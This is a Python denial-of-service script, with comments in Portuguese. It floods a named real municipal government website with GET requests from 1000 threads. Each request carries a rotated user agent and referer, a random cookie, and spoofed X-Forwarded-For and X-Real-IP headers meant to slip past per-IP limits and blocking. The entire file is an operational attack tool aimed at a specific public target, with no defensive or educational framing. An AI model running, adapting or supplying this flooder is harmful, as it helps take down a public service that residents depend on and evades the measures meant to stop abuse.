import threading
import requests
import random
import string
import time

target_url = "https://www.guaruja.sp.gov.br/"

with open('useragents.txt', 'r') as file:
    user_agents = [line.strip() for line in file.readlines()]

with open('referers.txt', 'r') as file:
    referers = [line.strip() for line in file.readlines()]

def generate_ip():
    "Gera um endereço IP aleatório, tentando ser mais 'robusto' ao variar os blocos de IP."
    blocks = [random.randint(0, 255) for _ in range(4)]
    return ".".join(str(block) for block in blocks)

def flood():
    while True:
        spoofed_ip = generate_ip()
        custom_headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Accept": "*/*",
            "Referer": random.choice(referers),
            "Accept-Encoding": "gzip, deflate",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": spoofed_ip,
            "X-Forwarded-Proto": "http",
            "X-Real-IP": spoofed_ip,
            "X-Frame-Options": "deny",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "DNT": "1",
            "If-None-Match": 'W/"cb85038b0d4e19"',
            "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
            "Cookie": "".join(random.choices(string.ascii_letters + string.digits, k=20))
        }
        try:
            response = requests.get(target_url, headers=custom_headers)
            print(f"GET request sent to {target_url} from spoofed IP {spoofed_ip}. Response status code: {response.status_code}")
            time.sleep(random.uniform(0.5, 2))  # Uma pequena pausa entre as requisições
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

num_threads = 1000

threads = []
for _ in range(num_threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()